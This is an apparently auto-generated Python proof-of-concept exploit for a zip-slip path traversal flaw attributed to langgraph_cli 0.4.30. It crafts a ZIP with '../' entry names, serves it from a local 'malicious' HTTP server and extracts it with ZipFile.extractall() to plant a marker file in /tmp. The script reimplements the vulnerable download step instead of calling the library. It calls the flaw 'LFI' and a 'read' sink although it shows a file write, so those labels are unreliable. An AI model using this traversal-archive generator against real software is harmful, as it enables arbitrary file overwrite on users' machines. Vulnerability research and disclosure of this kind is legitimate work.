#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: lfi-027
# Sink: read
# Auto-generated — run with: python3 lfi_zip_archive_url_extracts_read.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30

Vulnerability: ZipFile.extractall() is used without validating entry names,
allowing path traversal in ZIP archives. An attacker can craft a malicious ZIP
that writes files outside the intended extraction directory.

This PoC demonstrates the vulnerability by creating a benign payload that
creates a marker file in /tmp/ to prove arbitrary file write capability.
"""

import os
import sys
import io
import zipfile
import tempfile
import shutil
import argparse
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

def create_malicious_zip(target_file: str, content: str) -> bytes:
    """
    Create a ZIP archive with a path traversal entry.
    
    Args:
        target_file: Absolute path where the file should be written
        content: Content to write to the target file
    
    Returns:
        Bytes of the malicious ZIP archive
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Create an entry with path traversal to write outside extraction directory
        # The extraction path will be something like /tmp/extract_xxx/
        # We use enough ../ to reach the root, then specify the target path
        traversal_path = f"../../../{target_file.lstrip('/')}"
        
        # Add the malicious entry
        zf.writestr(traversal_path, content)
        
        # Also add a benign file to make the archive look legitimate
        zf.writestr("README.md", "# Malicious template\nThis is a PoC.")
    
    return zip_buffer.getvalue()

def serve_malicious_zip(port: int = 8888):
    """
    Start a simple HTTP server to serve the malicious ZIP.
    This simulates an attacker-controlled server.
    
    Args:
        port: Port to listen on
    """
    from http.server import HTTPServer, BaseHTTPRequestHandler
    
    class MaliciousZipHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            # Create a malicious ZIP that writes to /tmp/poc_success.txt
            malicious_zip = create_malicious_zip(
                "/tmp/poc_success.txt",
                "PWNED: Path traversal successful!\n"
            )
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/zip')
            self.send_header('Content-Length', str(len(malicious_zip)))
            self.end_headers()
            self.wfile.write(malicious_zip)
        
        def log_message(self, format, *args):
            # Suppress default logging
            pass
    
    server = HTTPServer(('0.0.0.0', port), MaliciousZipHandler)
    print(f"[*] Serving malicious ZIP on http://0.0.0.0:{port}/")
    print("[*] Press Ctrl+C to stop the server")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        server.server_close()

def exploit(target_url: str, output_dir: str = None):
    """
    Exploit the LFI vulnerability by downloading and extracting a malicious ZIP.
    
    Args:
        target_url: URL of the malicious ZIP archive
        output_dir: Directory to extract to (simulates the template extraction)
    """
    if output_dir is None:
        output_dir = tempfile.mkdtemp(prefix="langgraph_poc_")
    
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Extraction directory: {output_dir}")
    
    try:
        # Simulate the vulnerable _download_repo_with_requests function
        req = Request(target_url)
        
        with urlopen(req, timeout=10) as response:
            if response.status == 200:
                zip_data = response.read()
                
                # Extract using vulnerable ZipFile.extractall()
                with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                    print("[*] ZIP contents:")
                    for name in zf.namelist():
                        print(f"    - {name}")
                    
                    print("[*] Extracting ZIP (vulnerable extractall)...")
                    zf.extractall(output_dir)
                
                print(f"[+] Extraction complete to {output_dir}")
                
                # Check if the payload was written
                if os.path.exists("/tmp/poc_success.txt"):
                    print("[!] VULNERABILITY CONFIRMED: File written outside extraction directory!")
                    print(f"[!] Contents of /tmp/poc_success.txt:")
                    with open("/tmp/poc_success.txt", 'r') as f:
                        print(f.read())
                else:
                    print("[-] Payload file not found. Check if path traversal worked.")
                
                # List extracted files
                print(f"\n[*] Files in extraction directory:")
                for root, dirs, files in os.walk(output_dir):
                    for file in files:
                        filepath = os.path.join(root, file)
                        print(f"    - {filepath}")
                
    except HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        sys.exit(1)
    except URLError as e:
        print(f"[-] URL Error: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    finally:
        # Cleanup
        if os.path.exists(output_dir):
            shutil.rmtree(output_dir)
            print(f"[*] Cleaned up extraction directory: {output_dir}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30 via malicious ZIP"
    )
    parser.add_argument(
        "--serve",
        action="store_true",
        help="Start a malicious ZIP server (for testing)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=8888,
        help="Port for malicious ZIP server (default: 8888)"
    )
    parser.add_argument(
        "--url",
        type=str,
        help="URL of malicious ZIP to exploit (alternative to --serve)"
    )
    parser.add_argument(
        "--output",
        type=str,
        help="Output directory for extraction (default: temp dir)"
    )
    
    args = parser.parse_args()
    
    if args.serve:
        serve_malicious_zip(args.port)
    elif args.url:
        exploit(args.url, args.output)
    else:
        # Default: start server and exploit locally
        print("[*] Starting malicious ZIP server in background...")
        import threading
        server_thread = threading.Thread(target=serve_malicious_zip, args=(args.port,))
        server_thread.daemon = True
        server_thread.start()
        
        import time
        time.sleep(1)  # Give server time to start
        
        # Exploit using local server
        exploit(f"http://127.0.0.1:{args.port}/", args.output)

if __name__ == "__main__":
    print("=" * 60)
    print("PoC: LFI via Malicious ZIP in langgraph_cli-0.4.30")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates path traversal in ZipFile.extractall()")
    print("[*] A malicious ZIP can write files outside the extraction directory")
    print("[*] Payload: Write to /tmp/poc_success.txt")
    print()
    
    main()
